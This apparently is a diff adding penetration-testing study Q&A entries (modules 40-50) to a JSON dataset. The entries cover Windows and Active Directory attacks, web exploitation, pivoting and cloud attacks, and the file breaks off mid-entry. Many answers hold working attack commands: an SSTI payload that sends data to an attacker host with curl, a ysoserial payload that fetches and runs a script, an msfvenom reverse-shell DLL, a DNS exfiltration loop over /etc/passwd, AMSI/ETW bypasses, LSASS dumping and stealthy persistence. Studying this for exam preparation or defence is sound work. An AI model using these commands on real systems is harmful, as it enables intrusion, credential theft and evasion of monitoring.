+    "answer": "AMSI bypasses prevent content scanning before execution. ETW patches prevent events from being recorded in Windows event logs, reducing forensic traces for EDR correlation. ETW patch example (C#): patch the EtwEventWrite function in ntdll.dll to return immediately. In PowerShell: $a=[Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider'); the field '_m_enabled' is patched to 0. ETW bypass means no PowerShell script block logging. Both AMSI + ETW bypass together reduce detection surface significantly.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 40,
+    "prompt": "What should you check if PowerShell is in Constrained Language Mode?",
+    "answer": "Check: $ExecutionContext.SessionState.LanguageMode — returns 'ConstrainedLanguage' if restricted. This blocks Add-Type, .NET reflection, COM objects, and AMSI bypasses. Workarounds: 1. Find a bypass for the specific AppLocker/WDAC policy version. 2. Use PowerShell version 2 (powershell -version 2) if installed — no Constrained Language. 3. Switch to cmd.exe alternatives — certutil, mshta, regsvr32. 4. Write C# executable and run from disk. 5. MSBuild.exe with inline task compilation.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 41,
+    "prompt": "How do you detect SSRF and escalate it to reading internal services?",
+    "answer": "Detection: inject http://ATTACKER/test into URL parameters, headers (Referer, Host, X-Forwarded-For), and data fields. Confirm with Burp Collaborator / interactsh DNS callback. Escalation: (1) Target http://127.0.0.1:PORT to probe internal services — common ports 8080, 8443, 9200 (Elasticsearch). (2) http://169.254.169.254/latest/meta-data/ for AWS IAM credentials. (3) Gopher:// for SSRF-to-RCE via Redis/Memcached. Filter bypass: 127.0.0.1 -> 2130706433 (decimal), http://127.0.0.1.nip.io/, http://[::1]/.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 41,
+    "prompt": "Identify the SSTI payload for Jinja2 and construct an RCE payload.",
+    "answer": "Detection: {{7*7}} returns 49 in Jinja2/Twig. Jinja2 RCE using __globals__: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. Alternative: {{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode()}}. Note: the subclass index varies by Python version — enumerate with: {{''.__class__.__mro__[1].__subclasses__()}} to find subprocess.Popen. If output is filtered, use OOB: os.popen('curl http://ATTACKER/?d=$(id|base64)').read().",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 41,
+    "prompt": "Explain Java deserialization exploitation workflow with ysoserial.",
+    "answer": "Workflow: (1) Detect — send ysoserial URLDNS payload (no dependencies, safe): java -jar ysoserial.jar URLDNS 'http://collaborator' | base64 -w0. Confirm with DNS callback. (2) Fingerprint classpath — look for library names in error messages or class paths. (3) Select gadget chain — CommonsCollections1-6 (Apache Commons), Spring, Groovy. (4) Create RCE payload: java -jar ysoserial.jar CommonsCollections6 'curl http://10.10.14.5/ -o /tmp/s.sh; bash /tmp/s.sh' | base64 -w0. (5) Submit as cookie/parameter where deserialization occurs.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 41,
+    "prompt": "Describe the JWT RS256 to HS256 algorithm confusion attack.",
+    "answer": "JWT algorithms: RS256 uses RSA private key (server-only) to sign, public key to verify. HS256 uses a shared secret. Confusion attack: change 'alg' header from RS256 to HS256, then sign the JWT with the server's PUBLIC RSA key (which is usually obtainable). The library treats the public key as the HS256 secret and verifies it matches — exploit succeeds if vulnerable. Tool: python jwt_tool.py TOKEN -X k -pk /path/to/public.key. Also test alg:none — remove signature entirely.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 41,
+    "prompt": "What is mass assignment and how do you test for it in web applications?",
+    "answer": "Mass assignment occurs when a framework automatically binds HTTP request parameters to object properties, including ones not intended to be user-settable (role, isAdmin, balance). Testing: (1) GET the endpoint to see the full resource structure in response. (2) Include additional fields in PUT/PATCH/POST: if API returns {id:1, name:'user', role:'user'}, send PUT with {id:1, name:'user', role:'admin'}. (3) Check response — if role changes to 'admin', vulnerable. Common in Ruby on Rails, Laravel, Spring (before @JsonIgnore), Django REST Framework without read_only_fields.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 42,
+    "prompt": "How do you discover undocumented API endpoints during an API penetration test?",
+    "answer": "1. Documentation endpoints: /swagger, /swagger.json, /swagger-ui.html, /api-docs, /openapi.json, /graphql, /graphiql. 2. JavaScript analysis: pull all .js files with Burp suite and search for fetch('/api/', axios, endpoint strings. 3. Wordlist fuzzing: ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u http://target/FUZZ. 4. Mobile app reverse engineering: decompile APK with jadx, extract hardcoded endpoints. 5. JS source maps (/app.js.map) reveal original source with all endpoints.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 42,
+    "prompt": "Explain GraphQL introspection and why it is a security risk.",
+    "answer": "Introspection is a built-in GraphQL feature returning the full schema (all types, queries, mutations, fields). A single introspection query reveals every endpoint equivalent to the entire API specification: {__schema{types{name fields{name type{name}}}}}. Security risk: reveals sensitive API surface (internal admin mutations, hidden parameters, deprecated methods). Test with Burp repeater — POST to /graphql with Content-Type: application/json. If introspection is enabled, map all queries/mutations and test each for authorization issues.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 42,
+    "prompt": "What is BOLA (Broken Object Level Authorization) and how do you prove it?",
+    "answer": "BOLA (also called IDOR in REST context) occurs when the API uses user-controlled IDs to access objects without verifying ownership. Proof: (1) Create two accounts: userA (ID 44) and userB (ID 43). (2) As userA, send GET /api/v1/users/43 — if you receive userB's data, BOLA is confirmed. (3) Escalate: try accessing admin objects, payment records, private files. Document with: full request showing userA's auth token + request for userB's ID, full response showing userB's private data. BOLA is the #1 most critical API vulnerability.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 42,
+    "prompt": "How do you bypass API rate limiting?",
+    "answer": "Rate limits often rely on source IP or session. Bypass techniques: 1. IP spoofing headers — X-Forwarded-For: 127.0.0.1, X-Real-IP: 127.0.0.1, True-Client-IP: 127.0.0.1 (server may trust these if improperly configured). 2. IP rotation — multiple proxies changing client IP. 3. JSON parameter pollution — {\"username\":\"user\",\"username\":[\"user\",\"user\"]} — some parsers handle arrays differently. 4. Account rotation — create multiple accounts for distributed testing. 5. Time-based: rate limits reset; burst during reset window.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 42,
+    "prompt": "What are the key differences between testing REST APIs vs GraphQL APIs?",
+    "answer": "REST: multiple endpoints, each resource has a URL. Test each endpoint individually for auth bypass, IDOR. Verb-based (GET/POST/PUT/DELETE). GraphQL: single endpoint (/graphql), all via POST. One query language. Key differences for testing: (1) Introspection query gives full schema — skip endpoint discovery. (2) Test mutations for auth bypass (is createAdmin accessible to users?). (3) Batch attacks — send many queries in one request to bypass per-request rate limits. (4) Nested queries for DoS. (5) Same vuln categories but different discovery method.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 43,
+    "prompt": "What is a child-to-parent domain escalation and what trust property enables it?",
+    "answer": "In an AD forest, child domains (child.corp.local) trust the parent (corp.local) due to the automatic bidirectional transitive trust established during domain creation. SID filtering is DISABLED between same-forest domains by default. This means a compromised child domain with access to the child krbtgt hash can forge a Golden Ticket with the Enterprise Admins SID (S-1-5-21-ROOT_SID-519) in the ExtraSIDs field. The parent DC accepts this ticket, granting Enterprise Admin access to the root domain. One-liner to automate: impacket-raiseChild child.corp.local/admin:pass -target-exec rootdc.corp.local.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 43,
+    "prompt": "How does Unconstrained Delegation enable DA compromise through printer coercion?",
+    "answer": "Unconstrained Delegation: when set on a computer, any Kerberos ticket delegated to it includes the full TGT of the authenticating user. Exploitation: (1) Find hosts with unconstrained delegation: Get-DomainComputer -Unconstrained. If the host is not a DC but has this flag. (2) Compromise that host. (3) Coerce a DC to authenticate: SpoolSample.exe dc01.corp.local unconstrained.corp.local (abuses MS-RPRN print spool). (4) DC's TGT is cached on the compromised server. (5) Rubeus.exe dump /service:krbtgt /nowrap extracts DA TGT. (6) Rubeus.exe ptt imports it for full DA access.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 43,
+    "prompt": "Explain Constrained Delegation S4U exploitation.",
+    "answer": "Constrained Delegation allows specific services to impersonate any user to specific target services. Identified by msDS-AllowedToDelegateTo on service account. S4U2Self + S4U2Proxy: the service account requests a TGS on behalf of any user (even DA). Exploitation with Rubeus: Rubeus.exe s4u /user:svc_vuln /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:cifs/server.corp.local /ptt. This gives a TGS ticket allowing access to \\\\server.corp.local\\C$ as administrator. Verify: ls \\\\server.corp.local\\c$.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 43,
+    "prompt": "What is Resource-Based Constrained Delegation (RBCD) and how is it abused?",
+    "answer": "RBCD: msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the target computer determines which accounts can delegate to it. If you have GenericWrite on a computer object, you can configure this attribute. Attack: (1) Create a new computer account (up to 10 machines by default, controlled by ms-DS-MachineAccountQuota). (2) Set RBCD on target: Set-ADComputer target -PrincipalsAllowedToDelegateToAccount $FakeComputer. (3) S4U2Self+Proxy via Rubeus: impersonate administrator to CIFS/target service. Access \\\\target\\C$.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 43,
+    "prompt": "How do you enumerate trust relationships and determine attack paths?",
+    "answer": "Enumeration: Get-DomainTrustMapping (PowerView) — shows all in-forest and cross-forest trusts, direction, and type. Get-ForestTrust — forest-level trusts. BloodHound: marks trust boundaries; use custom queries to find cross-trust paths. Key factors for attack planning: 1. Trust direction (one-way vs bidirectional). 2. SID Filtering enabled (usually cross-forest) vs disabled (usually same-forest). 3. Selective Authentication (restricts which accounts can cross). 4. Transitivity (transitive = can hop through multiple domains). Document trust map for report.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 44,
+    "prompt": "Describe how to dump LSASS using comsvcs.dll and parse offline with pypykatz.",
+    "answer": "comsvcs.dll method evoids Mimikatz binary: (1) Get LSASS PID: tasklist | findstr lsass (e.g., 700). (2) Dump: rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 700 C:\\Temp\\lsass.dmp full. (3) Exfiltrate lsass.dmp to attacker. (4) Parse: pypykatz lsa minidump lsass.dmp. Output shows NTLM hashes, cleartext passwords (if WDigest enabled), Kerberos tickets. Store all hashes for lateral movement. Requires SeDebugPrivilege (usually available to local admins).",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 44,
+    "prompt": "What is Credential Guard and how does it affect LSASS dumping?",
+    "answer": "Credential Guard (Windows 10+, Server 2016+) isolates LSASS in a VBS (Virtualization Based Security) enclave so even SYSTEM cannot read NTLM hashes or Kerberos keys from LSASS memory. Mimikatz sekurlsa::logonpasswords returns empty or placeholder values. Alternatives when Credential Guard is active: (1) SAM/SYSTEM hive extraction (gives local account hashes only). (2) Kerberoasting (network-based, no LSASS needed). (3) AS-REP Roasting. (4) DCSync if DA. (5) DPAPI masterkey decryption for saved credentials.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 44,
+    "prompt": "Describe how to extract the SAM database to recover local account NTLM hashes.",
+    "answer": "SAM database stores local account NT hashes, encrypted with SYSKEY stored in SYSTEM hive. Steps: (1) reg save HKLM\\SAM C:\\Temp\\sam.hive. (2) reg save HKLM\\SYSTEM C:\\Temp\\system.hive. (3) reg save HKLM\\SECURITY C:\\Temp\\security.hive (for LSA secrets/cached domain hashes). (4) Copy to attacker. (5) impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL. Output: (local)hash format for CrackMapExec PTH. Requires local admin rights.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 44,
+    "prompt": "What persistence mechanisms should you use when you need to survive reboots discreetly?",
+    "answer": "Stealthy persistence options in order of detectability: 1. WMI Event Subscription — difficult to detect without specific tooling: $filter + $consumer + $binding for trigger on process start or schedule. 2. COM Hijacking — replace user-registered COM objects that get called by legit processes. 3. Scheduled task with obfuscated name mimicking Windows Update. 4. Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (user-level, survives logon). 5. DLL hijacking in writable app directory. Avoid HKLM run keys — high detection rate by security tools.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 44,
+    "prompt": "What does LaZagne collect and when should it be used?",
+    "answer": "LaZagne.exe is a credential harvesting tool collecting from 30+ sources: web browsers (Chrome, Firefox, IE), email clients (Thunderbird, Outlook), git config, SSH keys, Windows Credential Manager, FileZilla FTP, databases, Wifi passwords, PuTTY sessions, VPN config files, and many more. Run: .\\LaZagne.exe all -oJ -output C:\\Temp (JSON output). Most useful: on developer workstations (ssh keys, git credentials, AWS config), sysadmin desktops (PuTTY sessions with saved passwords), web servers (database connection strings in browser-stored credentials).",
+    "difficulty": "beginner"
+  },
+  {
+    "module_id": 45,
+    "prompt": "What is Pass-the-Hash and which protocols support it?",
+    "answer": "Pass-the-Hash (PTH) uses an NTLM hash directly for authentication without knowing the plaintext password. The NTLM authentication protocol accepts the hash as the response to a challenge. Protocols supporting PTH: SMB (nxc smb, impacket psexec/wmiexec/smbexec), WinRM (evil-winrm -H HASH), RDP with Restricted Admin mode (xfreerdp /pth:HASH — requires Restricted Admin to be enabled), LDAP (some impacket tools). Does NOT work with: Kerberos-only environments (NTLMv2 can be disabled by policy), Credential Guard systems.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 45,
+    "prompt": "Explain the stealth difference between psexec, smbexec, and wmiexec.",
+    "answer": "impacket-psexec: uploads PSEXESVC.exe to \\ADMIN$ share, creates a named pipe service. Highest detection — service creation is logged (Event 7045). Provides interactive cmd shell. smbexec: creates a temporary service per command, executes via cmd.exe, returns output. Less artifacts than psexec but still creates services (detectable). wmiexec: uses DCOM/WMI to execute commands — no service creation, no executable dropped. Lowest detection signature. Provides semi-interactive shell. For OPSEC: wmiexec > smbexec > psexec. All produce Event 4624 (logon) on target.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 45,
+    "prompt": "How do you use nxc (netexec/crackmapexec) to test lateral movement across a subnet?",
+    "answer": "1. Bulk auth test: nxc smb 10.10.10.0/24 -u administrator -H NTLM_HASH (domain auth). For local admin: add --local-auth. 2. Look for (Pwn3d!) in output — confirms admin access on that host. 3. Execute commands: nxc smb IP -u admin -H HASH -x 'whoami /all'. 4. Dump local hashes: nxc smb IP -u admin -H HASH --sam. 5. Spray credentials across many users: nxc smb DC_IP -u users.txt -p 'Password1' --continue-on-success. 6. Check shares: nxc smb range -u user -p pass --shares. Chain: PTH -> command exec -> new creds -> repeat.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 45,
+    "prompt": "What BloodHound queries are most useful for lateral movement planning?",
+    "answer": "1. Shortest Paths to Domain Admins — shows entire attack path from owned node. 2. Find All Users with Alternative Rights to DA — non-obvious ACL paths. 3. Computers where Domain Users can RDP — quick lateral movement targets. 4. Computers with Unconstrained Delegation — coerce + TGT capture pivot points. 5. High Value Targets — all Tier 0 assets. Custom: MATCH p=shortestPath((n:User {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p. Mark owned nodes with right-click to enable path analysis from compromised accounts.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 45,
+    "prompt": "Explain Kerberoasting as a lateral movement enabler in a new network segment.",
+    "answer": "After pivoting to a new network segment: (1) GetUserSPNs to find Kerberoastable accounts in the new domain/subnet: impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request -output hashes.txt. (2) Crack with hashcat: hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt. (3) Service account credentials often reused on multiple systems in the same segment. (4) High-privilege service accounts (backup, HR, it-admin) become your next set of lateral movement credentials enabling another round of nxc spray.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 46,
+    "prompt": "Explain how Ligolo-ng works and why it is preferred over proxychains for internal enumeration.",
+    "answer": "Ligolo-ng creates a TUN interface on the attacker machine, making the internal network reachable as if directly connected — no proxychains needed. Tools run at full speed natively. Setup: (1) Create tun: sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up. (2) Start proxy: ./proxy -selfcert -laddr 0.0.0.0:11601. (3) Upload agent to pivot, run: .\\agent.exe -connect ATTACKER:11601 -ignore-cert. (4) In proxy console: session -> start. (5) Add route: sudo ip route add 10.10.10.0/24 dev ligolo. Now tools reach 10.10.10.0/24 directly. Proxychains limitation: TCP only, slow, breaks many tools.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 46,
+    "prompt": "How do you set up Chisel reverse SOCKS5 when outbound ports are filtered?",
+    "answer": "Chisel can use HTTP/HTTPS on ports 80/443 to bypass egress filtering. Attacker: ./chisel server -p 8080 --reverse. Pivot host: .\\chisel.exe client ATTACKER:8080 R:socks. This creates a SOCKS5 proxy reverting to attacker (listening on 127.0.0.1:1080 by default). Configure: update /etc/proxychains4.conf: socks5 127.0.0.1 1080. Use: proxychains -q nmap -sT -Pn -p 80,443,445,3389 10.10.10.50. Host port 80/443 Chisel behind nginx/apache for maximum stealth — disguises as web traffic.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 46,
+    "prompt": "Explain double pivoting — how do you access a third network segment through two compromises?",
+    "answer": "Double pivot: Attacker -> Pivot1 (DMZ) -> Pivot2 (internal) -> Target3 (restricted). Method with Ligolo-ng: (1) Deploy agent on Pivot1, start tunnel to Attacker (segment 2 accessible). (2) Route segment 2 via ligolo. (3) Route agent traffic for segment 3 through Pivot2. Chisel alternative: Attacker (port 8080 server) <- Pivot1 (R:127.0.0.1:8081:socks) -> Pivot2 (R:127.0.0.1:8082:socks via Pivot1 chain). Each hop adds a proxychains entry. Keep track of each tunnel and what segment it unlocks in your pivot diagram.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 46,
+    "prompt": "When would you use DNS tunnelling (dnscat2) and how does it work?",
+    "answer": "DNS tunnelling bypasses restrictive firewalls that only allow DNS traffic out (port 53 UDP). dnscat2 encodes C2 traffic as DNS queries/responses — data is Base32-encoded in subdomain labels of queries to the attacker-controlled DNS server. Setup: (1) Control a domain (attacker.com) and set NS record to attacker VPS. (2) Start dnscat2 server: ruby dnscat2.rb attacker.com. (3) Victim: ./dnscat2 --dns server=attacker.com --secret=PASSWORD. Limitations: very low bandwidth (a few KB/s), high latency. Use only when no other channel available. Generates DNS query volume anomalies (detectable by DNS monitoring).",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 46,
+    "prompt": "What are the key commands to verify pivot connectivity before running scans?",
+    "answer": "Before running nmap through a pivot, verify the connection: 1. proxychains curl http://10.10.10.50/ — tests HTTP connectivity through SOCKS proxy. 2. proxychains nc -zv 10.10.10.50 445 — tests TCP port availability. 3. With Ligolo: curl http://10.10.10.50/ — runs natively without proxychains. 4. Ping (ICMP): often blocked by pivots — test TCP first. 5. proxychains nmap -sT -Pn -p 22,80,443,445 10.10.10.50 -T4 -- verify one host before scanning /24. Failed connectivity = wrong route, wrong SOCKS port, or tunnel dropped. Re-establish before scanning.",
+    "difficulty": "beginner"
+  },
+  {
+    "module_id": 47,
+    "prompt": "How do you discover sensitive files on Windows Active Directory shares?",
+    "answer": "Snaffler is the most effective tool: .\\Snaffler.exe -s -o snaffler.log. It reads all reachable SMB shares and ranks finds by sensitivity score (colour-coded: Red = critical, Yellow = interesting). Focuses on: .kdbx (KeePass), .ppk (PuTTY keys), .pfx (certificates), .config/.ini with passwords, SQL connection strings, Word/Excel files with 'password' in name. Manual: nxc smb RANGE --shares enumerates share names; nxc smb TARGET --spider-folder to spider content; smbclient //TARGET/share to browse interactively. Document share name, file path, and content type in findings.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 47,
+    "prompt": "What is the correct ethical approach to data exfiltration in a penetration test?",
+    "answer": "The correct approach: demonstrate access without causing harm. For a file: (1) Screenshot showing the file exists and its path. (2) Show first 2-5 lines (enough to prove content type/sensitivity). (3) Do NOT download/copy bulk PII, financial records, or trade secrets. For CPTS exam: screenshots of file listings with filenames, directory listing, or proof-of-access commands are sufficient evidence. In real engagements: clearly defined scope specifies what you're allowed to access and what to do with it. Immediately report critical data exposure to the client without retaining sensitive data.",
+    "difficulty": "beginner"
+  },
+  {
+    "module_id": 47,
+    "prompt": "Describe DNS-based data exfiltration and when to use it.",
+    "answer": "DNS exfiltration encodes file data into DNS query hostnames — only DNS traffic allowed. Method: (1) Base64-encode file content. (2) Split into <=63 char chunks (DNS label limit). (3) For each chunk: nslookup CHUNK.attacker.com (or as subdomain in any query). Attacker's DNS server logs all incoming queries. Example: for chunk in $(cat /etc/passwd | base64 | fold -w 50); do dig @attacker.com ${chunk}.exfil.attacker.com +short; done. Use when: firewalls block all outbound except DNS. Slow (~5KB/min). Generates anomalous DNS volume — use for demonstration only, not for bulk exfiltration.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 47,
+    "prompt": "How do you use Snaffler and what does its output tell you?",
+    "answer": "Snaffler automatically discovers sensitive content across SMB shares from any domain-joined host. Run: .\\Snaffler.exe -s -o snaffler.log -v data. Colour coding: Red (highest) = KeePass databases, private keys, token files. Yellow = config files with credential patterns, SQL connection strings. Green = potentially interesting (scripts, backups). Blue/White = low interest. Output format: [DateTime] [Colour] {MatchRule} file path [match]. Filter results: grep -i 'red' snaffler.log. Each Red finding is a reportable credential exposure. Document file path, content preview, and access method.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 47,
+    "prompt": "What post-exploitation database commands yield the most valuable intelligence?",
+    "answer": "After compromising a database server: MySQL/MSSQL: 1. List databases: SHOW DATABASES; / SELECT name FROM sys.databases. 2. Dump user tables: SELECT username, password FROM users LIMIT 5. 3. Find app config: look for settings/config tables with API keys. 4. MSSQL xp_cmdshell: EXEC xp_cmdshell 'whoami'; (if enabled). MongoDB without auth: db.adminCommand({listDatabases:1}); db.users.find({},{'username':1,'password':1}).limit(5). Redis: KEYS * shows all keys, GET key for values. Often stores session tokens and cached credentials. Document: DB type, version, table names accessed, credential count.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 48,
+    "prompt": "How do you leverage SSRF vulnerabilities to obtain cloud IAM credentials?",
+    "answer": "AWS EC2 Instance Metadata Service (IMDS): (1) Confirm SSRF: inject http://169.254.169.254/ into URL parameter/header. (2) Enumerate metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/ — lists attached IAM role name. (3) Get credentials: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME. Response: {AccessKeyId, SecretAccessKey, Token, Expiration}. (4) Configure: export AWS_ACCESS_KEY_ID=; export AWS_SECRET_ACCESS_KEY=; export AWS_SESSION_TOKEN=. (5) aws sts get-caller-identity; aws iam list-policies --scope Local. IMDSv2 requires PUT token first: TOKEN=$(curl -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds:21600' http://169.254.169.254/latest/api/token); curl -H 'X-aws-ec2-metadata-token:$TOKEN' http://169.254.169.254/latest/meta-data/iam/security-credentials/.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 48,
+    "prompt": "What makes an S3 bucket vulnerable and how do you confirm public access?",
+    "answer": "S3 buckets are vulnerable when: (1) ACL grants s3:GetObject to 'AllUsers' or 'AuthenticatedUsers'. (2) Bucket policy allows public access. (3) Block Public Access settings are disabled. Confirmation: aws s3 ls s3://BUCKET_NAME --no-sign-request (no creds, anonymous). curl https://BUCKET_NAME.s3.amazonaws.com/ — returns XML listing if public. Common naming patterns: domain-name, company-backup, company-dev, company-assets, company-data, company-prod-config. Tool: s3scanner.py for automated permutation testing. Public bucket with PII data = Critical finding with regulatory implications (GDPR, HIPAA).",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 48,
+    "prompt": "Describe the AWS IAM privilege escalation via iam:PassRole and lambda:CreateFunction.",
+    "answer": "iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction = full privilege escalation to any role. Scenario: user can create Lambda functions and pass any role to them. (1) List roles: aws iam list-roles | grep admin. (2) Create function with admin role: aws lambda create-function --function-name pwn --runtime python3.9 --role arn:aws:iam::ACCOUNT:role/AdminRole --handler lambda_function.handler --zip-file fileb://exploit.zip. (3) Invoke: aws lambda invoke --function-name pwn output.txt. Function runs as AdminRole — can create IAM users, modify policies, access all services.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 48,
+    "prompt": "How do you use ScoutSuite for a cloud security audit?",
+    "answer": "ScoutSuite is an open-source multi-cloud security auditing tool. AWS: python3 scout.py aws --report-dir ./scout-report --no-browser (requires configured aws-cli credentials). Azure: python3 scout.py azure --cli (uses native az cli auth). GCP: python3 scout.py gcp --user-account. Output: HTML report in scout-report/ directory. Key sections: IAM (over-privileged roles, unused credentials), S3/Blob/Bucket (public access), Security Groups (0.0.0.0/0 inbound rules), CloudTrail (logging disabled), Key Management (KMS, rotation). Filter by Danger level to prioritize findings.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 48,
+    "prompt": "What are the top three cloud misconfigurations to check early in an assessment?",
+    "answer": "1. Public S3/GCS/Blob storage — test with no credentials. Exposed buckets often contain config files, backups, PII. 2. Overly permissive IAM — aws iam simulate-principal-policy tests effective permissions. Look for administrative rights attached to instance profiles accessible via SSRF. 3. Security group rules allowing 0.0.0.0/0 on sensitive ports — aws ec2 describe-security-groups | jq '.SecurityGroups[].IpPermissions[]' searching for FromPort 22, 3306, 5432, 1433 with CidrIp 0.0.0.0/0. These three consistently appear in cloud breach reports and are quick wins.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 49,
+    "prompt": "How do you approach static analysis of a .NET thick client application?",
+    "answer": "Workflow: (1) De4dot deobfuscation (if obfuscated): de4dot.exe app.exe -o app_clean.exe. (2) Open in dnSpy. (3) Browse namespace tree — look for Auth, Login, Database, Crypto, Config namespaces. (4) Search All (Ctrl+F): strings 'password', 'api_key', 'secret', 'connection'. (5) Review connection string setup — often in App.config or hardcoded in constructors. (6) Look for SSL certificate validation bypass: ServicePointManager.ServerCertificateValidationCallback = () => true. (7) Find SQL query construction — often via string concatenation = SQLi. (8) Decompile to C# project for full analysis.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 49,
+    "prompt": "How do you intercept thick client traffic with Burp Suite when the app is not a browser?",
+    "answer": "Steps: (1) Install Burp CA certificate in Windows system certificate store (not just browser): certmgr.msc -> Trusted Root Certification Authorities -> Import Burp CA. (2) For apps that use WinHTTP: set system proxy via ProxyCap or Proxifier to route all traffic through 127.0.0.1:8080. (3) Alternatively: add proxy settings to app configuration file if supported. (4) Some apps use hardcoded proxy settings — patch via dnSpy or hex editor. (5) For apps with certificate pinning: (a) patch validation code in dnSpy, (b) use Frida to hook and bypass pinning at runtime. Confirm interception with Burp seeing requests.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 49,
+    "prompt": "What Process Monitor (Procmon) filters reveal security-relevant thick client behavior?",
+    "answer": "Useful Procmon filters for thick client testing: (1) Process Name = app.exe (filter to target process). (2) Result = NAME NOT FOUND + Path ends with .dll — reveals DLL hijacking opportunities in writable directories. (3) Path contains 'AppData' — shows config file locations. (4) Operation = ReadFile + Path contains config/passwords/credentials — reveals credential file reads. (5) Operation = WriteFile — shows what the app writes on startup/use (may include cleartext credentials). Capture startup sequence by starting Procmon before launching the app. Export filtered results to CSV for documentation.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 49,
+    "prompt": "How do you exploit a DLL hijacking opportunity found in a thick client?",
+    "answer": "DLL hijacking: (1) Identify writable directory where app searches for a DLL not found (Procmon: NAME NOT FOUND on .dll in app directory). (2) Confirm write permission: icacls 'C:\\Program Files\\App'. (3) Create malicious DLL matching the name: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o evil.dll. (4) Copy to target directory: copy evil.dll 'C:\\Program Files\\App\\missing.dll'. (5) Restart app (or wait for scheduled execution). (6) Catch reverse shell from context the app runs in (if service: SYSTEM, if user-launched: user context). DLL hijacking in services yields SYSTEM.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 49,
+    "prompt": "What database interaction tests should you run when analyzing a thick client?",
+    "answer": "1. Check if app connects directly to database server (not via API) — Procmon network connections or Wireshark. 2. Capture connection string (Procmon, Wireshark, dnSpy). 3. Extract credentials from connection string and connect directly: sqlcmd -S server -U user -P pass (try sa account). 4. Test SQL injection via app interface: enter ' in all input fields, look for error messages. 5. With connection string: connect from attacker and enumerate all tables directly. 6. MSSQL: check for xp_cmdshell access: EXEC xp_cmdshell 'whoami'. Direct DB access bypasses all application-layer security.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 50,
+    "prompt": "Describe the searchsploit workflow for rapidly finding and adapting public exploits.",
+    "answer": "Workflow: (1) Enumerate exact version: nmap -sV or curl -I or whatweb. (2) Search: searchsploit apache 2.4.49 or searchsploit vsftpd 2.3.4. (3) Review multiple hits — check dates and platform column. (4) Read source before running: searchsploit -x PATH. (5) Copy local: searchsploit -m PATH. (6) Check dependencies and hardcoded values (IPs, paths). (7) Adapt: update LHOST, target path, payload. (8) Test on local identical version first. (9) Run against target with listener ready. Always Google 'CVE-XXXX-XXXX exploit github' — community PoC may be better than Exploit-DB version.",
+    "difficulty": "beginner"
+  },
+  {
+    "module_id": 50,
+    "prompt": "Explain Log4Shell (CVE-2021-44228) — what makes it exploitable and how do you confirm it?",
